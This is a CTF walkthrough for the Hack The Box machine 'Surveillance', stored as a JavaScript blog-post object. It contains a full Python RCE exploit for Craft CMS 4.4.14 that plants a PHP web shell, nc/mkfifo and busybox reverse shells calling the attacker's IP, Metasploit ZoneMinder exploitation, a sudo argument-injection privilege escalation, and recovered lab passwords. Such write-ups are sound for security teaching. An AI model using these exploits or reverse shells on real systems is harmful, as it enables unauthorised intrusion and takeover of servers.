const newPost = {
    title: 'Surveillance',
    body: `
    <ul>
    <li><h1>Enumeration</h1>
    </ul>
    <div class="script-container"><p> First as usual , We will start with Nmap scan to gather the open ports , Services , OS detection , ... </p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─# nmap -Pn --disable-arp-ping -n -sV --min-parallelism 64 10.10.11.245
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-18 12:46 EST
    Nmap scan report for 10.10.11.245
    Host is up (0.29s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 11.76 seconds
    
    </code></pre>
    </ul>
    <div class="script-container"><p>let's take a look at the webserver at the 80 port , But first le'ts add the hostname to the hosts file</p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─# echo "10.10.11.245 surveillance.htb" >> /etc/hosts
    </code></pre>
    </ul>
    <figure><img src="https://github.com/N1NJ10/N1NJ10.github.io/blob/main/images/HTB/Surveillance/webpage.png?raw=true" alt=""><figcaption></figcaption></figure>
    </code></pre>
    </ul>
    <div class="script-container"><p>Okey maybe there is more webpages , Let's find that with gobuster </p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~]
    └─# gobuster dir -u http://surveillance.htb/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://surveillance.htb/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /images               (Status: 301) [Size: 178] [--> http://surveillance.htb/images/]
    /index                (Status: 200) [Size: 1]
    /img                  (Status: 301) [Size: 178] [--> http://surveillance.htb/img/]
    <mark style ="background: yellow">/admin</mark>                (Status: 302) [Size: 0] [--> http://surveillance.htb/admin/login]
    /css                  (Status: 301) [Size: 178] [--> http://surveillance.htb/css/]
    /js                   (Status: 301) [Size: 178] [--> http://surveillance.htb/js/]
    /logout               (Status: 302) [Size: 0] [--> http://surveillance.htb/]
    /p1                   (Status: 200) [Size: 16230]
    </code></pre>
    </ul>
    <p>Allright , We find that there is an admin webpage </P> 
    <figure><img src="https://github.com/N1NJ10/N1NJ10.github.io/blob/main/images/HTB/Surveillance/adminlogin.png?raw=true" alt=""><figcaption></figcaption></figure>
    <p>After inspecting the http://surveillance.htb/ page we find that the version of the CMS is <mark style ="background: yellow">4.4.14</mark></p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/images/HTB/Surveillance/version.png" alt=""><figcaption></figcaption></figure>
    <ul>
    <li><h1>Exploit</h1>
    </ul>
    </code></pre>
    </ul>
    <div class="script-container"><p>After googling we find that there is a RCE exploit for this version i put them <a href="https://pastebin.com/qaz0cg37">here</a>
    <ul>
    <pre><code>
    import requests
    import re
    import sys

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36"
    }

    def writePayloadToTempFile(documentRoot):

        data = {
            "action": "conditions/render",
            "configObject[class]": "craft\elements\conditions\ElementCondition",
            "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"msl:/etc/passwd"}}}'
        }

        files = {
            "image1": ("pwn1.msl", """<?xml version="1.0" encoding="UTF-8"?>
            <image>
            <read filename="caption:&lt;?php @system(@$_REQUEST['cmd']); ?&gt;"/>
            <write filename="info:DOCUMENTROOT/shell.php">
            </image>""".replace("DOCUMENTROOT", documentRoot), "text/plain")
        }

        response = requests.post(url, headers=headers, data=data, files=files, proxies={"http": "http://localhost:8080"})

    def getTmpUploadDirAndDocumentRoot():
        data = {
            "action": "conditions/render",
            "configObject[class]": "craft\elements\conditions\ElementCondition",
            "config": r'{"name":"configObject","as ":{"class":"\\GuzzleHttp\\Psr7\\FnStream", "__construct()":{"methods":{"close":"phpinfo"}}}}'
        }

        response = requests.post(url, headers=headers, data=data)

        pattern1 = r'<tr><td class="e">upload_tmp_dir<\/td><td class="v">(.*?)<\/td><td class="v">(.*?)<\/td><\/tr>'
        pattern2 = r'<tr><td class="e">\$_SERVER\[\'DOCUMENT_ROOT\'\]<\/td><td class="v">([^<]+)<\/td><\/tr>'
    
        match1 = re.search(pattern1, response.text, re.DOTALL)
        match2 = re.search(pattern2, response.text, re.DOTALL)
        return match1.group(1), match2.group(1)

    def trigerImagick(tmpDir):
        
        data = {
            "action": "conditions/render",
            "configObject[class]": "craft\elements\conditions\ElementCondition",
            "config": '{"name":"configObject","as ":{"class":"Imagick", "__construct()":{"files":"vid:msl:' + tmpDir + r'/php*"}}}'
        }
        response = requests.post(url, headers=headers, data=data, proxies={"http": "http://127.0.0.1:8080"})    

    def shell(cmd):
        response = requests.get(url + "/shell.php", params={"cmd": cmd})
        match = re.search(r'caption:(.*?)CAPTION', response.text, re.DOTALL)

        if match:
            extracted_text = match.group(1).strip()
            print(extracted_text)
        else:
            return None
        return extracted_text

    if __name__ == "__main__":
        if(len(sys.argv) != 2):
            print("Usage: python CVE-2023-41892.py <url>")
            exit()
        else:
            url = sys.argv[1]
            print("[-] Get temporary folder and document root ...")
            upload_tmp_dir, documentRoot = getTmpUploadDirAndDocumentRoot()
            tmpDir = "/tmp" if upload_tmp_dir == "no value" else upload_tmp_dir
            print("[-] Write payload to temporary file ...")
            try:
                writePayloadToTempFile(documentRoot)
            except requests.exceptions.ConnectionError as e:
                print("[-] Crash the php process and write temp file successfully")

            print("[-] Trigger imagick to write shell ...")
            try:
                trigerImagick(tmpDir)
            except:
                pass

            print("[-] Done, enjoy the shell")
            while True:
                cmd = input("$ ")
                shell(cmd)
    </code></pre>
    </ul>
    <p>Note : To make this work read the exploit you will find that it creates a connection with the 8080 port which is the default port to listen in the burp suite so you can delete the proxies parameter or just open the burp <p>
    <div class="script-container"><p>Give it a shoot</a>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/HTB/Surveillance]
    └─# python3 exploit.py http://surveillance.htb/
    [-] Get temporary folder and document root ...
    [-] Write payload to temporary file ...
    [-] Trigger imagick to write shell ...
    [-] Done, enjoy the shell
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    $ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.15 7777 >/tmp/f <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">#reverse_shells</a>
    </code></pre>
    </ul>
    <div class="script-container"><p>so I tried to establish my shell by opening it with Netcat then I uploaded a PHP reverse shell in the web directory to get a meterpreter session </a>
    <ul>
    <pre><code>
    # Get the shell & upload the php reverse shell 

    ┌──(root㉿N1NJ10)-[~]
    └─# rlwrap -cAr nc -nlvp 7777
    listening on [any] 7777 ...
    connect to [10.10.16.15] from (UNKNOWN) [10.10.11.245] 36760
    /bin/sh: 0: can't access tty; job control turned off
    $ /bin/bash -i
    bash: cannot set terminal process group (1087): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@surveillance:~/html/craft/web$ id
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@surveillance:~/html/craft/web$ wget http://10.10.16.15/revphp_7788.php
    </craft/web$ wget http://10.10.16.15/revphp_7788.php
    --2023-12-18 16:45:00--  http://10.10.16.15/revphp_7788.php
    Connecting to 10.10.16.15:80... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 1112 (1.1K) [application/octet-stream]
    Saving to: 'revphp_7788.php'

        0K .                                                     100% 15.9K=0.07s

    2023-12-18 16:45:00 (15.9 KB/s) - 'revphp_7788.php' saved [1112/1112]
    </code></pre>
    </ul>
    <p>Then open your handler and access your reverse shell from your browser <\p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/images/HTB/Surveillance/shell%20from%20web.png" alt=""><figcaption></figcaption></figure>
    <ul>
    <li><h1>Playing Around</h1>
    </ul>
    <div class="script-container"><p>You should get a session opened in meterpreter , So I tried to play around I found that there is an SQL file in the  storage/backups dir so I copied it to the /web dir to download it via my browser or  you can easily download it from your session </a>
    <ul>
    <pre><code>
    www-data@surveillance:~/html/craft/storage/backups$ cp surveillance--2023-10-17-202801--v4.4.14.sql.zip ../../web/surveillance--2023-10-17-202801--v4.4.14.sql.zip
    </code></pre>
    </ul>
    <p>After downloading the file and unzip it we find a hash of belong to the user called matthew </p>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/images/HTB/Surveillance/mathew.png" alt=""><figcaption></figcaption></figure>
    <p>You can use hashcat or jtr to crack this hash but I prefer to check cracking websites such crackstation and dcode.fr .. , I found that matthew password is starcraft122490 </p>
    <figure><img src="https://github.com/N1NJ10/N1NJ10.github.io/blob/main/images/HTB/Surveillance/passme.png?raw=true" alt=""><figcaption></figcaption></figure>
    <div class="script-container"><p>try to login with ssh with matthew creds or by su you will find the flag in the user home</a>
    <ul>
    <pre><code>
    www-data@surveillance:/home$ su matthew
    su matthew
    Password: starcraft122490
    /bin/bash -i 
    bash: cannot set terminal process group (1087): Inappropriate ioctl for device
    bash: no job control in this shell
    matthew@surveillance:/home$ 
    </code></pre>
    </ul>
    <div class="script-container"><p>Then i run linpeas , It gives me valuable informations</p>
    <ul>
    <pre><code>
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                          
tcp        0      0 <mark style ="background: yellow">127.0.0.1:8080</mark>          0.0.0.0:*               LISTEN      -                                                      
tcp        0      0 <mark style ="background: yellow">127.0.0.1:3306</mark>           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  

══╣ PHP exec extensions
lrwxrwxrwx 1 root root 42 Oct 17 16:25 /etc/nginx/sites-enabled/zoneminder.conf -> <mark style ="background: yellow">/etc/nginx/sites-available/zoneminder.conf</mark>
server {
    listen 127.0.0.1:8080;
    
    root /usr/share/zoneminder/www;
    
    index index.php;
    
    access_log /var/log/zm/access.log;
    error_log /var/log/zm/error.log;
    
    location / {
        try_files $uri $uri/ /index.php?$args =404;
    
        location ~ /api/(css|img|ico) {
            rewrite ^/api(.+)$ /api/app/webroot/$1 break;
            try_files $uri $uri/ =404;
        }
        location /api {
            rewrite ^/api(.+)$ /api/app/webroot/index.php?p=$1 last;
        }
        location /cgi-bin {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_pass unix:/run/fcgiwrap.sock;
        }
        
        location ~ \.php$ {
            include fastcgi_params;
            
            fastcgi_param SCRIPT_FILENAME $request_filename;
            fastcgi_param HTTP_PROXY "";
            
            fastcgi_index index.php;
            
            fastcgi_pass unix:/var/run/php/php8.1-fpm-zoneminder.sock;
        }
    }
}


╔══════════╣ Analyzing Backup Manager Files (limit 70)
rw-r--r-- 1 root zoneminder 3503 Oct 17 11:32 /usr/share/zoneminder/www/api/app/Config/database.php
                <mark style ="background: yellow">'password' => ZM_DB_PASS</mark>,
                'database' => ZM_DB_NAME,
                'host' => 'localhost',
                <mark style ="background: yellow">'password' => 'ZoneMinderPassword2023'</mark>,
                'database' => 'zm',
                                $this->default['host'] = $array[0];
                        $this->default['host'] = ZM_DB_HOST;
╔══════════╣ Analyzing Env Files (limit 70)
-rw-r--r-- 1 root root 0 May  2  2023 /usr/lib/node_modules/passbolt_cli/node_modules/psl/.env                                         
-rw-r--r-- 1 www-data www-data 836 Oct 21 18:32 /var/www/html/craft/.env
CRAFT_APP_ID=CraftCMS--070c5b0b-ee27-4e50-acdf-0436a93ca4c7
CRAFT_ENVIRONMENT=production
CRAFT_SECURITY_KEY=2HfILL3OAEe5X0jzYOVY5i7uUizKmB2_
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
<mark style ="background: yellow">CRAFT_DB_PORT=3306</mark>
CRAFT_DB_DATABASE=craftdb
<mark style ="background: yellow">CRAFT_DB_USER=craftuser</mark>
<mark style ="background: yellow">CRAFT_DB_PASSWORD=CraftCMSPassword2023!</mark>
CRAFT_DB_SCHEMA=
CRAFT_DB_TABLE_PREFIX=
DEV_MODE=false
ALLOW_ADMIN_CHANGES=false
DISALLOW_ROBOTS=false
PRIMARY_SITE_URL=http://surveillance.htb/
    </code></pre>
    </ul>
    <div class="script-container"><p>I tried to use any of those passwords but with no chance , Then I noticed that the other user have the same name with the service that run on the 8080 port zoneminder so I try to port forwarding this port to access it via my machine with metthew creds</p>
    <ul>
    <pre><code>
    ┌──(root㉿N1NJ10)-[~/HTB/Surveillance]
    └─# ssh -L 7654:127.0.0.1:8080 matthew@10.10.11.245
    matthew@10.10.11.245's password: 
    Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    System information as of Mon Dec 18 08:16:58 PM UTC 2023

    System load:  0.0               Processes:             267
    Usage of /:   84.2% of 5.91GB   Users logged in:       1
    Memory usage: 24%               IPv4 address for eth0: 10.10.11.245
    Swap usage:   0%

    => There is 1 zombie process.


    Expanded Security Maintenance for Applications is not enabled.

    0 updates can be applied immediately.

    Enable ESM Apps to receive additional future security updates.
    See https://ubuntu.com/esm or run: sudo pro status


    The list of available updates is more than a week old.
    To check for new updates run: sudo apt update
    Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


    Last login: Mon Dec 18 18:59:31 2023 from 10.10.16.15
    matthew@surveillance:~$ 
    </code></pre>
    </ul>
    <figure><img src="https://raw.githubusercontent.com/N1NJ10/N1NJ10.github.io/main/images/HTB/Surveillance/zoneee.png" alt=""><figcaption></figcaption></figure>
    <div class="script-container"><p>After googling I found there is a default creds to this <a href="https://www.openhab.org/addons/bindings/zoneminder/">admin:admin</a> and other creds that we found but with no chance so I try find the version of the service and other creds that we found but with no chance so I try find the version of the service</p>
    <ul>
    <pre><code>
    matthew@surveillance:/usr/share/zoneminder$ dpkg -s zoneminder | grep Version
    <mark style ="background: yellow">Version: 1.36.32+dfsg1-1</mark>
    </code></pre>
    </ul>
    <p>After googling i found that there is an Unauthenticated RCE exploit you can find it <a href="https://pastebin.com/Rvk7DVbr">here</a> , I tried them but with no chance to get any reverse connection </p>
    <ul>
    <li><h1>Exploit Again</h1>
    </ul>
    <div class="script-container"><p>So let's try to test the same exploit but with the MSF </p>
    <ul>
    <pre><code>
    msf6 exploit(multi/handler) > search zoneminder

    Matching Modules
    ================

    #  Name                                                Disclosure Date  Rank       Check  Description
    -  ----                                                ---------------  ----       -----  -----------
    0  exploit/unix/webapp/zoneminder_lang_exec            2022-04-27       excellent  Yes    ZoneMinder Language Settings Remote Code Execution
    1  exploit/unix/webapp/zoneminder_snapshots            2023-02-24       excellent  Yes    ZoneMinder Snapshots Command Injection
    2  exploit/unix/webapp/zoneminder_packagecontrol_exec  2013-01-22       excellent  Yes    ZoneMinder Video Server packageControl Command Execution


    Interact with a module by name or index. For example info 2, use 2 or use exploit/unix/webapp/zoneminder_packagecontrol_exec

    msf6 exploit(multi/handler) > use 1
    msf6 exploit(unix/webapp/zoneminder_snapshots) > set rhosts 127.0.0.1
    rhosts => 127.0.0.1
    msf6 exploit(unix/webapp/zoneminder_snapshots) > set rport 7654
    rport => 7654
    msf6 exploit(unix/webapp/zoneminder_snapshots) > set TARGETURI /
    msf6 exploit(unix/webapp/zoneminder_snapshots) > set payload cmd/linux/http/x86/shell_reverse_tcp
    payload => cmd/linux/http/x86/shell_reverse_tcp
    msf6 exploit(unix/webapp/zoneminder_snapshots) > run
    [*] Started reverse TCP handler on 10.10.16.15:4444 
    [*] Running automatic check ("set AutoCheck false" to disable)
    [*] Elapsed time: 13.242346220002219 seconds.
    [+] The target is vulnerable.
    [*] Fetching CSRF Token
    [+] Got Token: key:8c00c05695a8eb3bf8d3a8f6563aec122b4b930a,1702936733
    [*] Executing nix Command for cmd/linux/http/x86/shell_reverse_tcp
    [*] Sending payload
    [*] Sending stage (3045380 bytes) to 10.10.11.245
    [+] Payload sent
    [*] Command shell session 2 opened (10.10.16.15:4444 -> 10.10.11.245:36810) at 2023-12-18 17:51:21 -0500
    /bin/bash -i
    bash: cannot set terminal process group (1110): Inappropriate ioctl for device
    bash: no job control in this shell
    zoneminder@surveillance:/usr/share/zoneminder/www$ id
    uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
    </code></pre>
    </ul>
    <p>It worked ! , Now we have a shell as zoneminder user i after playing around i find that the zoneminder have a sudo permmision to run zoneminde service command as root</p>
    <div class="script-container"><p>with sudo -l </p>
    <ul>
    <pre><code>
    zoneminder@surveillance:/usr/share/zoneminder/www$ sudo -l
    Matching Defaults entries for zoneminder on surveillance:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
        use_pty

    User zoneminder may run the following commands on surveillance:
        (ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
    zoneminder@surveillance:/usr/bin$ ls zm[a-zA-Z]*.pl             
        zmaudit.pl
        zmcamtool.pl
        zmcontrol.pl
        zmdc.pl
        zmfilter.pl
        zmonvif-probe.pl
        zmonvif-trigger.pl
        zmpkg.pl
        zmrecover.pl
        zmstats.pl
        zmsystemctl.pl
        zmtelemetry.pl
        zmtrack.pl
        zmtrigger.pl
        zmupdate.pl
        zmvideo.pl
        zmwatch.pl
        zmx10.pl
    </code></pre>
    </ul>
    <p>So it means we should know how every file work to exploit them , you can read the source code of them from <a href="https://github.com/ZoneMinder/zoneminder/tree/master/scripts">here</a> or the documentation from <a href="https://zoneminder.readthedocs.io/en/stable/userguide/components.html#perl">here</a><p>
    <div class="script-container"><p>After reading the source code of each of them i found that we can exploit the --user from zmcamtool.pl and --user or --password from zmupdate.pl by injecting them with our milicious reverse shell</p>
    <ul>
    <pre><code>
    # Create our root reverse shell
    zoneminder@surveillance:/tmp$ echo 'rm /tmp/x;mkfifo /tmp/x;cat /tmp/x|/bin/sh -i 2>&1|nc 10.10.16.15 9999 >/tmp/x' > rev.sh
    zoneminder@surveillance:/tmp$ chmod +x rev.sh

    # Exploit 
    zoneminder@surveillance:/tmp$ sudo /usr/bin/zmcamtool.pl --user="$(/tmp/rev.sh)" --export test.sql &
    zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --user="$(/tmp/rev.sh)" --pass=ZoneMinderPassword2023 --dir=/tmp/rev.sh --version=1 &

    # Attacker Machine WTF 
    ┌──(root㉿N1NJ10)-[~/HTB/Surveillance]
    └─# rlwrap -cAr nc -nlvp 9999
    listening on [any] 9999 ...
    connect to [10.10.16.15] from (UNKNOWN) [10.10.11.245] 55840
    id
    uid=1001(<mark style="background: yellow">zoneminder</mark>) gid=1001(<mark style="background: yellow">zoneminder</mark>) groups=1001(<mark style="background: yellow">zoneminder</mark>)
    </code></pre>
    </ul>
    <ul>
    <li><h1>Root Me</h1>
    </ul>
    <p>It is confusing me cuz this work but it come back with zoneminder user !!</p>

    <div class="script-container"><p>After googling I found that there may be a reverse shell Is the problem so I tried many shells I found a new way with a busybox command so I tried to understand what is it. As I understand this command it removes the uncommon, rarely-used command options you can read more from <a href="https://pastebin.com/V8qPLZcp">here</a> so let's try it </p>
    <ul>
    <pre><code>
    # Transfer our reverse shell
    ┌──(root㉿N1NJ10)-[~/HTB/Surveillance]
    └─# cat rev.sh             
    #!/bin/bash
    busybox nc 10.10.16.15 9999 -e sh
                                                                                                                                        
    ┌──(root㉿N1NJ10)-[~/HTB/Surveillance]
    └─# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

    # Get the rev.sh file && Exploit
    zoneminder@surveillance:/tmp$ wget http://10.10.16.15/rev.sh
    zoneminder@surveillance:/tmp$ sudo /usr/bin/zmupdate.pl --user="$(/tmp/rev.sh)" --pass=ZoneMinderPassword2023 --version=1 &  # This worked with root rev shell
    zoneminder@surveillance:/tmp$ sudo /usr/bin/zmcamtool.pl --user="$(/tmp/rev.sh)" --export test.sql &  # This also worked but with zoneminder rev shell 
    
    # Attacker Machine 
    ┌──(root㉿N1NJ10)-[~/HTB/Surveillance]
    └─# rlwrap -cAr nc -nlvp 9999
    listening on [any] 9999 ...
    connect to [10.10.16.15] from (UNKNOWN) [10.10.11.245] 40066
    id
    uid=0(root) gid=0(root) groups=0(root)
    cd ../../root
    ls
    root.txt
    cat root.txt
    N1NJ10
    </code></pre>
    </ul>
    <p>That&#39;s it, my friend, I&#39;m happy to share with you more of my articles and tips & tricks If you wanaa to be updated with my stuff just Subscribe to our Telegram channel :</strong>&#x20;</p>
    <a href="https://t.me/N1NJ10" data-rnwi-u529wo-aq1qub-c1zw6o-1k4bu33-1cut0bx-na6qhi--hover="true" data-rnwi--1tgwseu--focus="true" data-rnwi-5xr8s6-dse9kg-1rbj2e8-2fw26j-focus-visible="true" data-rnwi-handle="BaseCard" class="base-card" r-lrvibr r-1loqt21 r-1otgn73 r-m2nopt r-z2wwpe r-rs99b7 r-1udh08x r-1clhhh9 r-18u37iz r-1awozwy r-nsbfu8" ><div class="image-icon"><img alt="" src="https://avatars.githubusercontent.com/u/92612410?v=4" width="100%" height="auto" decoding="async" data-rnwibasecard--6b6lzv-hover="true" data-rnwi-handle="nearest" class="r-hd655f" style="width: 32px; height: 32px; border-radius: 4px;"></div><div class="css-175oi2r r-1ro0kt6 r-16y2uox r-1wbh5a2"><div class="css-175oi2r r-18u37iz r-1awozwy"><div dir="auto" data-rnwibasecard--6b6lzv-hover-focus="true" data-rnwi-handle="nearest" class="css-1rynq56 r-dnmrzs r-1udh08x r-1udbk01 r-3s2u2q r-1iln25a r-gg6oyi r-ubezar r-135wba7 r-majxgm r-z9jf92" title="Penetration Testing with Shellcode: Detect, exploit, and secure network-level and operating system vulnerabilities">N1NJ10 Channel</div></div><div class="css-175oi2r"><div dir="auto" class="css-1rynq56 r-gg6oyi r-1b43r93 r-16dba41 r-hbpseb r-1f2v84d">https://t.me/N1NJ10</div></div></div></a>
    <p>LinkedIn:-</strong> <a href="https://www.linkedin.com/in/fadymoheb">https://www.linkedin.com/in/fadymoheb</strong></a></p>
    <p>Facebook:-</strong> <a href="https://www.facebook.com/FADYMo7eB">https://www.facebook.com/FADYMo7eB</strong></a></p>
    <p>Twitter:-</strong> <a href="https://twitter.com/FadyMo7eb?s=09">https://twitter.com/FadyMo7eb?s=09</strong></a></p>
    <p>Tryhackme:-</strong> <a href="https://tryhackme.com/p/FadyMoheb">https://tryhackme.com/p/FadyMoheb</strong></a></p>
    <p>HackTheBox:-</strong> <a href="https://app.hackthebox.com/profile/921394">https://app.hackthebox.com/profile/FadyMoheb</strong></a></p>

    <p>> See you in another great writeup 😉</strong></p>
    
    `,
    description: 'Let’s see how to CTF the Surveillance HTB',
    date: new Date(2023, 11, 15),
    previewPicture: '/pages/Photos/BROKER.png',
    tags: ['htb','ctf','linux','cve'],
    author: 'N1NJ10',
    category: 'CTF'
};

export default newPost;
